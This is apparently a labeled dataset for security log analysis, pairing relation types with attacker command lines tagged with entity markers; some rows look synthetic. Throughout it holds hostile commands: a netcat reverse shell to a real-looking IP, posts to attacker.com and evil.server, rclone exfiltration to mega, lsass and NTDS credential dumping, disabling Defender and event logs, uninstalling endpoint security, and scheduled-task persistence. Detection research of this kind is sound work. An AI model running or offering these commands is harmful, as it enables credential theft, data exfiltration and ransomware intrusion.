process-file-exec(e1,e2)	<e1>svchost.exe</e1> /c start <e2>/usr/local/bin/backdoor</e2>
process-process-fork(e1,e2)	"<e1>C:\Windows\System32\schtasks.exe</e1> /Create /SC MINUTE /TN ""Update service for Windows Service"" /TR <e2>PowerShell.exe</e2> -ExecutionPolicy bypass -windowstyle hidden -File C:\Users\Administrator\update.ps1 /MO 30 /F"
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>taskkill</e2> /IM svchost.exe /F
process-file-chmod(e1,e2)	"<e1>icacls</e1> <e2>""C:\*""</e2> /grant Everyone\:F /T /C /Q"
process-file-chmod(e1,e2)	powershell.exe <e1>chmod</e1> 777 <e2>C:\ProgramData\updater.exe</e2>
process-file-chmod(e1,e2)	powershell.exe <e1>attrib</e1> +s +h <e2>C:\Windows\Temp\evil.dll</e2>
process-file-write(e1,e2)	"<e1>reg</e1> add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v DefaultUserName /t REG_SZ /d <e2><REDACTED-DOMAIN-NAME>\backup2</e2> /f"
process-file-unlink(e1,e2)	powershell.exe <e1>Remove-Item</e1> <e2>C:\Windows\Temp\evil.dll</e2> -Force
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>attrib</e2> +s +h C:\Windows\Temp\evil.dll
process-file-read(e1,e2)	C:\Windows\system32\cmd.exe /c <e1>dir</e1> /s /b <e2>C:\Windows\system32\*htable.xsl</e2>
process-file-unlink(e1,e2)	python.exe <e1>del</e1> <e2>C:\ProgramData\updater.exe</e2>
process-process-fork(e1,e2)	"cmd.exe /C <e1>netsh</e1> advfirewall firewall add rule dir=out name =""WMI_OUT"" <e2>program=C:\Windows\system32\svchost.exe</e2> service=winmgmt action=allow protocol=TCP localport=any > C:\Windows\Temp\WkiMfXXo.tmp 2>&1"
process-file-write(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>AdFind.exe</e1> -f ""objectcategory=person"" sAMAccountName name displayName givenName department description title mail logonCount -csv > <e2>person.csv</e2>"
process-socket-send(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>wmic</e1> <e2>/node:<REDACTED></e2> process call create ""cmd /C > C:\ProgramData\1.txt 2>&1 reg query HKEY_USERS\<SID>\Network"""
process-process-inject(e1,e2)	python.exe <e1>dllinjector.exe</e1> -p <e2>notepad.exe</e2> -d payload.dll
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>nc</e2> -lvp 4444 -s http://attacker.com/c2
process-process-unlink(e1,e2)	<e1>rundll32.exe</e1> kill (Get-Process <e2>svchost.exe.Id)</e2>
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>nc</e2> -lvp 4444 -s https://evil.server/payload
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>rm</e2> /var/tmp/hide.so
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /C <e2>netsh</e2> advfirewall firewall add rule dir=in name=""DCOM"" program=C:\Windows\system32\svchost.exe service=rpcss action=allow protocol=TCP localport=135 > C:\Windows\Temp\VlPWyecW.tmp 2>&1"
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>ping</e1> <e2>ENDPOINT</e2>
process-socket-send(e1,e2)	"rundll32.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>192.168.1.100:8080</e2> -Body 'cmd=whoami'"""
process-process-unlink(e1,e2)	<e1>schtasks</e1> /delete /tn <e2>Microsoft\Windows\Windows Defender\Windows Defender Cleanup</e2> /f
process-process-unlink(e1,e2)	<e1>taskkill</e1> -f -im <e2>MsDtsSrvr.exe</e2>
process-socket-send(e1,e2)	"%WINDIR%\system32\cmd.exe /C <e1>.\rclone.exe</e1> copy ""E:\REDACTED\domain"" <e2>mega:REDACTED/domain</e2> -q --ignore-existing --REDACTED-confirm --multi-thread-streams 12 --transfers 12 --no-console"
process-file-read(e1,e2)	"<e1>reg</e1> query <e2>hkcu\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall</e2> /v ""DisplayName"""
process-file-write(e1,e2)	<e1>cmd.exe</e1> /c copy \\REDACTED\c\windows\temp\p.bat <e2>c:\windows\temp\</e2>
process-file-read(e1,e2)	<e1>cmd_3.exe</e1> /c type <e2>C:\Windows\System32\drivers\etc\hosts</e2>
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet""</e2> /v ""SubmitSamplesConsent"" /t REG\_DWORD /d ""0"" /f"
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeam.backup.cloudservice.exe</e2> /F
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>echo</e2> 00e4f7418cd > \\.\pipe\9090e9
process-file-write(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C af.exe -f ""objectcategory=computer"" > <e2>ad_computers.txt</e2>"
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon""</e2> /v DefaultPassword /t REG\_SZ /d JapanNight!128 /f"
process-file-write(e1,e2)	"<e1>powershell_53.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_53.ps1',</e2> 'Invoke-Mimikatz')"""
process-process-fork(e1,e2)	"<e1>svchost.exe</e1> <e2>powershell</e2> -c ""Invoke-RestMethod -Uri http://attacker.com/c2 -Body 'cmd=whoami'"""
process-process-fork(e1,e2)	"<e1>powershell.exe</e1> <e2>""ntdsutil.exe</e2> 'ac i ntds' 'ifm' 'create full c:\ProgramData\ntdsutil' q q"""
process-file-exec(e1,e2)	C:\Windows\system32\cmd.exe /c cd %appdata%\Microsoft\Network && <e1>python.exe</e1> <e2>Packages.txt</e2>
process-file-read(e1,e2)	<e1>ex.exe</e1> x -prootBRUCE -y <e2>C:\Windows\<REDACTED>\AppData\Local\Temp\istx64f.rar</e2> C:\Windows\<REDACTED>\AppData\Local\Temp\mstrx\<file>
process-socket-send(e1,e2)	"<e1>svchost.exe</e1> --config svchost.conf --progress --no-check-certificate copy ""\\ServerName\C\ShareName"" <e2>ftp1:/DomainName/FILES/C/ShareName</e2>"
process-socket-send(e1,e2)	"svchost.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>192.168.1.100:8080</e2> -Body 'cmd=whoami'"""
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork 192.168.1.100:8080
process-file-write(e1,e2)	"cmd.exe /C wmic /node:""servername.domainname"" process call create <e1>""C:\PerfLogs\procdump.exe</e1> -accepteula -ma lsass <e2>C:\PerfLogs\lsass.dmp""</e2>"
process-file-write(e1,e2)	"cmd.exe /c <e1>REG</e1> ADD <e2>""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\smss.exe""</e2> /f /v Debugger /t REG_SZ /d ""C:\windows\system32\svchost.exe"""
process-file-exec(e1,e2)	<e1>rundll32.exe</e1> <e2>C:\Users\redacted\AppData\Local\Temp\wsuC3C.tmp,ControlUnitSpeed</e2>
process-process-unlink(e1,e2)	"<e1>net</e1> stop <e2>""Acronis VSS Provider""</e2> /y"
process-process-unlink(e1,e2)	"<e1>C:\Windows\System32\net.exe</e1> stop <e2>""veeamcloudsvc""</e2> /y"
process-file-chmod(e1,e2)	<e1>attrib</e1> +h <e2>XMRig CPU mine.exe</e2>
process-file-write(e1,e2)	<e1>rundll32_83.exe</e1> shell32.dll,Control_RunDLL <e2>C:\Temp\config.ini</e2>
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>nc</e2> -lvp 4444 -s 10.10.10.10:4444
process-file-write(e1,e2)	<e1>certutil_25.exe</e1> -encode input_25.txt <e2>C:\temp\encoded_25.txt</e2>
process-file-chmod(e1,e2)	wmic.exe <e1>attrib</e1> +s +h <e2>/usr/local/bin/backdoor</e2>
process-process-fork(e1,e2)	"<e1>VeeamHax.exe</e1> --verbose --target <backup server> --port 9401 --cmd <e2>""c:\windows\notepad.exe""</e2> --sql ""EXEC sp\_configure 'show advanced options', '1'"""
process-file-write(e1,e2)	wmic /node:REDACTED /user:DOMAIN\USER /password:REDACTED process call create <e1>cmd.exe</e1> /c copy \\REDACTED\c$\windows\temp\p.bat <e2>c:\windows\temp</e2>
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server""</e2> /t REG_DWORD /v ""TSAppCompat"" /d 0 /f"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>chmod</e2> 777 C:\Windows\Temp\evil.dll
process-process-unlink(e1,e2)	rundll32.exe <e1>taskkill</e1> /IM <e2>taskmgr.exe</e2> /F
process-process-unlink(e1,e2)	python.exe <e1>taskkill</e1> /IM <e2>notepad.exe</e2> /F
process-file-write(e1,e2)	<e1>cmd.exe</e1> /Q /c whoami /all 1> <e2>\\127.0.0.1\ADMIN$\____REDACTED</e2> 2>&1
process-file-chmod(e1,e2)	python.exe <e1>attrib</e1> +s +h <e2>/usr/local/bin/backdoor</e2>
process-file-chmod(e1,e2)	<e1>c:\windows\system32\wevtutil.exe</e1> set-log <e2>internet explorer</e2> /enabled:false
process-process-inject(e1,e2)	<e1>rundll32.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>svchost.exe</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>net</e2> localgroup Administrators
process-file-read(e1,e2)	<e1>cmd_98.exe</e1> /c type <e2>C:\Windows\System32\drivers\etc\hosts</e2>
process-file-write(e1,e2)	<e1>procdump64.exe</e1> -accepteula -ma lsass.exe <e2>C:\ProgramData\lsass.dmp</e2>
process-process-fork(e1,e2)	<e1>%WINDIR%\system32\cmd.exe</e1> /C <e2>nslookup</e2>
process-process-fork(e1,e2)	<e1>cmd_35.exe</e1> /c <e2>echo</e2> malicious > C:\Temp\evil_35.bat
process-file-read(e1,e2)	<e1>7z_96.exe</e1> x <e2>C:\Users\Public\archive_96.7z</e2> -so > nul
process-file-write(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C copy \\<REMOTE_WORKSTATION>\C$\ProgramData\lsass.dmp <e2>c:\programdata\lsass.dmp</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>PsExec64.exe</e2> -accepteula \\<DOMAIN-CONTROLLER-IP> -c -f -d -s up.bat
process-socket-send(e1,e2)	<e1>rundll32.exe</e1> locker.dll,run /TARGET=\\HOST1.DOMAIN.NAME\C$ <e2>/TARGET=\\HOST2.DOMAIN.NAME\C$</e2> /TARGET=\\HOST3.DOMAIN.NAME\C$ /login=DOMAIN\Administrator /password=[REDACTED] /nolog /shareall
process-process-unlink(e1,e2)	rundll32.exe <e1>taskkill</e1> /IM <e2>lsass.exe</e2> /F
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>attrib</e2> +s +h /usr/local/bin/backdoor
process-file-exec(e1,e2)	<e1>rundll32</e1> <e2>C:\PerfLogs\socks64.dll</e2>, rundll
process-file-read(e1,e2)	"<e1>wmic</e1> /node:<REDACTED> /user:""<REDACTED>"" /password:""<REDACTED>"" <e2>logicaldisk</e2> get caption,description,drivetype,providername,volumename"
process-process-unlink(e1,e2)	wmic.exe <e1>taskkill</e1> /IM <e2>taskmgr.exe</e2> /F
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>attrib</e2> +s +h C:\Users\Public\runme.bat
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>chmod</e2> 777 /usr/local/bin/backdoor
process-socket-receive(e1,e2)	cmd.exe <e1>nc</e1> -lvp 4444 -s <e2>http://attacker.com/c2</e2>
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server""</e2> /t REG_DWORD /v ""IdleWinStationPoolCount"" /d 1 /f"
process-file-read(e1,e2)	<e1>REG</e1> QUERY <e2>HKEY\_LOCAL\_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection</e2> /v EnableLUA
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>ping</e1> <e2>[Domain Controller]</e2>
process-socket-send(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c echo 92d8cc45954 > <e2>\\.\pipe\446b3c</e2>
process-socket-send(e1,e2)	python.exe <e1>curl</e1> -X POST --data 'ping' <e2>10.10.10.10:4444</e2>
process-process-inject(e1,e2)	<e1>svchost.exe</e1> Set-ProcessInjection -Target <e2>notepad.exe</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>del</e2> /usr/local/bin/backdoor
process-file-read(e1,e2)	<e1>pse.exe</e1> -accepteula <e2>@a.txt</e2> -c -f -d -s ufo.exe > log.txt
process-file-chmod(e1,e2)	wmic.exe <e1>attrib</e1> +s +h <e2>/tmp/malware.sh</e2>
process-process-fork(e1,e2)	"%WINDIR%\system32\cmd.exe /C <e1>wmic</e1> /node:""REDACTED"" process call create <e2>""%WINDIR%\Temp\svhost.exe</e2> 143.244.146[.]183"""
process-file-write(e1,e2)	<e1>notepad_23.exe</e1> <e2>C:\Users\test\notes_23.txt</e2>
process-process-unlink(e1,e2)	"<e1>C:\Windows\System32\net.exe</e1> stop <e2>""veeamdeploysvc""</e2> /y"
process-process-unlink(e1,e2)	<e1>cmd.exe</e1> Stop-Process -Name <e2>winlogon.exe</e2> -Force
process-file-exec(e1,e2)	<e1>python.exe</e1> /c start <e2>/tmp/malware.sh</e2>
process-file-write(e1,e2)	<e1>cmd.exe</e1> /Q /c cd \ 1> <e2>\\127.0.0.1\ADMIN$\____REDACTED</e2> 2>&1
process-process-fork(e1,e2)	<e1>cmd_84.exe</e1> /c <e2>echo</e2> %USERNAME% >> C:\output\users_84.txt
process-file-write(e1,e2)	"<e1>Seatbelt.exe</e1> -group=all -outputfile= <e2>""C:\ProgramData\seatinfo.txt""</e2>"
process-file-write(e1,e2)	cmd.exe /c <e1>reg.exe</e1> save hklm\security <e2>c:\users\REDACTED\appdata\local\temp\1\iszmqwmjemt</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>echo</e2> 0291f1e69dd > \\.\pipe\82afc1
process-file-chmod(e1,e2)	wmic.exe <e1>chmod</e1> 777 <e2>C:\ProgramData\updater.exe</e2>
process-file-unlink(e1,e2)	cmd.exe <e1>rm</e1> <e2>C:\ProgramData\updater.exe</e2>
process-file-write(e1,e2)	<e1>certutil_88.exe</e1> -encode input_88.txt <e2>C:\temp\encoded_88.txt</e2>
process-file-write(e1,e2)	<e1>certutil_36.exe</e1> -encode input_36.txt <e2>C:\temp\encoded_36.txt</e2>
process-file-read(e1,e2)	"<e1>net</e1> group <e2>""Domain computers""</e2> /dom"
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>ping</e1> <e2>HOSTX</e2>
process-socket-receive(e1,e2)	cmd.exe <e1>socat</e1> <e2>TCP4-LISTEN:8080,fork</e2> http://attacker.com/c2
process-process-fork(e1,e2)	"<e1>schtasks</e1> /create /tn K0adic /tr <e2>""C:\Windows\system32\mshta.exe</e2> C:\ProgramData\SZWXNUHHDP.hta"" /sc onlogon /ru System /f"
process-file-exec(e1,e2)	<e1>wmic.exe</e1> -exec <e2>/var/tmp/hide.so</e2>
process-socket-send(e1,e2)	svchost.exe <e1>curl</e1> -X POST --data 'ping' <e2>http://attacker.com/c2</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>reg.exe</e2> save hklm\security c:\users\REDACTED\appdata\local\temp\1\iszmqwmjemt
process-process-unlink(e1,e2)	<e1>taskkill</e1> /f /im <e2>SafeDogServerUI.exe</e2>
process-file-read(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C for /f %i in <e2>(C:\ProgramData\hosts.txt)</e2> do ping -n 1 %i -v 4 | find /I TTL >> C:\ProgramData\hosts_live.txt
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /Q /c start <e2>%%programdata%%\schcache\mswow86.exe</e2>
process-file-read(e1,e2)	"<e1>python_27.exe</e1> -c <e2>""open('C:\\temp\\pw_27.txt').read()""</e2>"
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>taskkill</e2> /IM lsass.exe /F
process-process-fork(e1,e2)	"<e1>schtasks</e1> /run /TN <e2>""schdsWin""</e2>"
process-file-unlink(e1,e2)	cmd.exe /c <e1>DEL</e1> <e2>%USERPROFILE%\AppData\bigfile.exe</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>adfind.exe</e2> -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > some.csv
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>net</e2> view \\WORKSTATION /all
process-file-read(e1,e2)	cmd.exe /C <e1>dir</e1> <e2>*.dll</e2>
process-file-write(e1,e2)	cmd_5.exe /c <e1>echo</e1> malicious > <e2>C:\Temp\evil_5.bat</e2>
process-file-write(e1,e2)	<e1>nc</e1> -e /bin/bash 104.200.67.3 1608 2> <e2>/dev/null</e2>
process-file-read(e1,e2)	<e1>powershell_25.exe</e1> Get-Content <e2>C:\Users\Public\secrets_25.txt</e2>
process-process-inject(e1,e2)	<e1>wmic.exe</e1> Set-ProcessInjection -Target <e2>lsass.exe</e2>
process-file-write(e1,e2)	cmd.exe /C <e1>adfind.exe</e1> -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > <e2>some.csv</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>chmod</e2> 777 /tmp/malware.sh
process-process-fork(e1,e2)	<e1>powershell.exe</e1> /c start <e2>cmd.exe</e2>
process-file-write(e1,e2)	cmd_94.exe /c <e1>echo</e1> %USERNAME% >> <e2>C:\output\users_94.txt</e2>
Other	cmd /C > <e1>C:\ProgramData\1.txt</e1> 2>&1 <e2>reg</e2> query HKEY_USERS\\<SID>\Network
process-file-unlink(e1,e2)	rundll32.exe <e1>del</e1> <e2>C:\Windows\Temp\evil.dll</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>ping</e2> <hostname redacted>
process-process-unlink(e1,e2)	cmd.exe <e1>taskkill</e1> /IM <e2>explorer.exe</e2> /F
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /c <e2>rmdir</e2> /S /Q ""C:\Windows\system32\config\systemprofile\EmailStorage_REDACTED-REDACTED_REDACTED"""
process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""Sophos AutoUpdate"" call uninstall /nointeractive"
process-file-write(e1,e2)	"wmic /node:""TARGET_HOST_IP"" /user:""DOMAIN\USER"" /password:""PASSWORD"" process call create <e1>""cmd.exe</e1> /c copy \\SOURCE_SERVER_IP\c\windows\temp\p.bat <e2>c:\windows\temp""</e2>"
process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>adfind.exe</e1> -gcb -sc trustdmp > <e2>trustdmp.txt</e2>
process-file-read(e1,e2)	<e1>cscript.exe</e1> /b /e\:VBScript.Encode <e2>C:\Windows\SERVIC\~1\MSSQL$\~1\AppData\Local\Temp\xit</e2> 579562847
process-process-inject(e1,e2)	<e1>cmd.exe</e1> Set-ProcessInjection -Target <e2>taskmgr.exe</e2>
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>del</e2> C:\ProgramData\updater.exe
process-socket-receive(e1,e2)	powershell.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>http://attacker.com/c2</e2>
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>curl</e2> -X POST --data 'ping' http://attacker.com/c2
process-file-exec(e1,e2)	<e1>svchost.exe</e1> -exec <e2>C:\Users\Public\runme.bat</e2>
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> runas /user:admin <e2>wmic.exe</e2>
process-file-chmod(e1,e2)	<e1>c:\windows\system32\wevtutil.exe</e1> set-log <e2>active directory web services</e2> /enabled:false
process-process-fork(e1,e2)	<e1>cmd_94.exe</e1> /c <e2>echo</e2> %USERNAME% >> C:\output\users_94.txt
process-file-write(e1,e2)	<e1>certutil_82.exe</e1> -encode input_82.txt <e2>C:\temp\encoded_82.txt</e2>
process-process-unlink(e1,e2)	"<e1>C:\Windows\System32\net.exe</e1> stop <e2>""samss""</e2> /y"
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /C <e2>netsh</e2> advfirewall firewall add rule dir=in name =""WMI"" program=C:\Windows\system32\svchost.exe service=winmgmt action = allow protocol=TCP localport=any > C:\Windows\Temp\XsssmLZZ.tmp 2>&1"
process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""Symantec Endpoint Protection""</e2> call uninstall /nointeractive"
process-file-read(e1,e2)	<e1>notepad_44.exe</e1> <e2>C:\Users\admin\notes_44.txt</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>mofcomp.exe</e2> C:\Windows\SERVIC\~1\MSSQL$\~1\AppData\Local\Temp\xitmf
process-file-unlink(e1,e2)	svchost.exe <e1>del</e1> <e2>C:\Users\Public\runme.bat</e2>
process-process-fork(e1,e2)	"REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""microsoft update"" /t REG_SZ /F /D <e1>""SCHTASKS</e1> /run /tn <e2>9T6ukfi6""</e2>"
process-file-read(e1,e2)	<e1>wscript_13.exe</e1> readAll <e2>C:\inetpub\wwwroot\web_13.config</e2>
process-socket-send(e1,e2)	"<e1>rclone.exe</e1> copy ""\\SERVER.domain.name\path"" <e2>mega:1</e2> -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6"
process-file-chmod(e1,e2)	wmic.exe <e1>attrib</e1> +s +h <e2>/var/tmp/hide.so</e2>
process-file-exec(e1,e2)	<e1>powershell.exe</e1> -executionpolicy remotesigned -File <e2>.\Get-DataInfo.ps1</e2> method
process-process-inject(e1,e2)	<e1>cmd.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>winlogon.exe</e2>
process-file-read(e1,e2)	"<e1>netsh</e1> advfirewall firewall set rule <e2>group=""windows management instrumentation (wmi)""</e2> new enable=yes"
process-file-exec(e1,e2)	"<e1>rundll32.exe</e1> -Command ""Start-Process <e2>/tmp/malware.sh""</e2>"
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>ping</e1> <e2>HOST</e2>
process-file-read(e1,e2)	<e1>rclone</e1> copy [REDACTED]:/mnt/sdd/REDACTED --include-from <e2>include.txt</e2>
process-process-unlink(e1,e2)	<e1>rundll32.exe</e1> Stop-Process -Name <e2>taskmgr.exe</e2> -Force
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>nc</e2> -lvp 4444 -s 10.10.10.10:4444
process-socket-send(e1,e2)	"<e1>netsh</e1> advfirewall firewall add rule name=""allow RDP"" dir=in protocol=TCP <e2>localport=3389</e2> action=allow"
process-file-unlink(e1,e2)	cmd.exe <e1>rm</e1> <e2>C:\Users\Public\runme.bat</e2>
process-file-read(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C where /r C:\Windows\WinSxS\ <e2>*Microsoft.ActiveDirectory.Management.dll*</e2>
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server""</e2> /t REG_DWORD /v ""fSingleSessionPerUser"" /d 0 /f"
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>curl</e2> -X POST --data 'ping' 192.168.1.100:8080
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>attrib</e2> +s +h C:\Windows\Temp\evil.dll
process-socket-send(e1,e2)	<e1>cmd.exe</e1> /q /c download c:\users\<user>\documents\<doc> /home/kali/desktop/<doc> 1> <e2>\\127.0.0.1\admin$\<num>.<num></e2> 2>&1
process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""Sophos Remote Management System""</e2> call uninstall /nointeractive"
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>python3</e2> -m http.server 8080 --bind 192.168.1.100:8080
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>del</e2> C:\Users\Public\runme.bat
process-file-read(e1,e2)	powershell.exe <e1>dllinjector.exe</e1> -p explorer.exe -d <e2>payload.dll</e2>
process-socket-send(e1,e2)	<e1>rundll32.exe</e1> Invoke-WebRequest -Uri <e2>https://evil.server/payload</e2> -Method POST
process-process-fork(e1,e2)	"<e1>schtasks</e1> /create /ru SYSTEM /sc ONSTART /tn Update2 /tr <e2>""cmd</e2> /c rundll32 %PUBLIC%\music\svcmc.dll, MainFunc"" schtasks /run /TN Update2"
process-socket-send(e1,e2)	"%WINDIR%\system32\cmd.exe /C <e1>wmic</e1> <e2>/node:""REDACTED""</e2> process call create ""%WINDIR%\Temp\svhost.exe 143.244.146[.]183"""
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>attrib</e2> +s +h /var/tmp/hide.so
process-file-chmod(e1,e2)	python.exe <e1>chmod</e1> 777 <e2>/usr/local/bin/backdoor</e2>
process-socket-send(e1,e2)	wmic.exe <e1>curl</e1> -X POST --data 'ping' <e2>192.168.1.100:8080</e2>
process-file-write(e1,e2)	C:\Windows\System32\cmd.exe /C <e1>dir</e1> \\[REDACTED HOST]\c\users >> <e2>listing.txt</e2>
process-process-fork(e1,e2)	<e1>cmd_91.exe</e1> /c <e2>echo</e2> %USERNAME% >> C:\output\users_91.txt
process-process-unlink(e1,e2)	<e1>sc</e1> config <e2>MSExchangeDiagnostics</e2> start= disabled
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>reg</e2> query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>DEL</e2> %USERPROFILE%\AppData\bigfile.exe
process-socket-receive(e1,e2)	<e1>rclone.exe</e1> copy <e2>\\REDACTED\Shares</e2> mega:Shares -q --ignore-existing --auto-confirm --multi-thread-streams 4 --transfers 4
process-file-exec(e1,e2)	<e1>powershell.exe</e1> -exec <e2>C:\Windows\Temp\evil.dll</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\svchost.exe</e1> -k <e2>netsvcs</e2> -p -s Schedule
process-socket-send(e1,e2)	"<e1>wmic</e1> <e2>/node:""192.168.1.2""</e2> process call create ""C:\Perflogs\434.bat"""
process-file-chmod(e1,e2)	"<e1>net</e1> localgroup ""Remote Desktop Users"" <e2>WDAGUtilityAccount2</e2> /add"
process-socket-receive(e1,e2)	<e1>powershell</e1> invoke-webrequest -uri <e2>http://mrassociattes.com/images/62.gif</e2> -outfile c:\programdata\COIm.jpg
process-file-write(e1,e2)	<e1>mshta_69.exe</e1> -write <e2>C:\Users\Public\hta_payload_69.hta</e2>
process-file-exec(e1,e2)	"<e1>cmd.exe</e1> /c <e2>""%temp%\magnu.w.bat""</e2>"
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>ping</e1> <e2>190.114.254.116</e2>
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>curl</e2> -X POST --data 'ping' https://evil.server/payload
process-file-unlink(e1,e2)	wmic.exe <e1>del</e1> <e2>/tmp/malware.sh</e2>
process-file-read(e1,e2)	"<e1>powershell_18.exe</e1> -Command ""gc <e2>C:\ProgramData\conf_18.yaml""</e2>"
process-process-fork(e1,e2)	"<e1>PsExec.exe</e1> /accepteula @comps1.txt -u ""domain.local\Administrator"" -p ""REDACTED"" <e2>cmd</e2> /c COPY ""\\REDACTED\share$\ds.exe"" ""%WINDIR%\temp"""
